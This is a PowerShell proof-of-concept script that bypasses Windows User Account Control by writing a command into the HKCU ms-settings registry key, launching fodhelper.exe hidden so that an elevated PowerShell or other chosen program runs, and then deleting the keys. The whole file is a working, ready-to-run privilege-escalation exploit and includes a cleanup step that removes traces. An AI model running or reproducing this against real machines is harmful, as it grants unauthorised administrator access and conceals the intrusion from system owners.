﻿﻿<#
.SYNOPSIS  
    This script is a proof of concept to bypass the User Access Control (UAC) via fodhelper.exe
    It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform an UAC bypass to start any application. 
.EXAMPLE  
     Load "cmd.exe /c powershell.exe" (it's default):
     FodhelperBypass 
     Load specific application:
     FodhelperBypass -program "cmd.exe"
     FodhelperBypass -program "cmd.exe /c powershell.exe"   
#>
function FodhelperBypass(){ 
 Param (     
        [String]$program = "cmd /c start powershell.exe" #default
       )
    #Create registry structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

    #Perform the bypass
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    #Remove registry structure
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}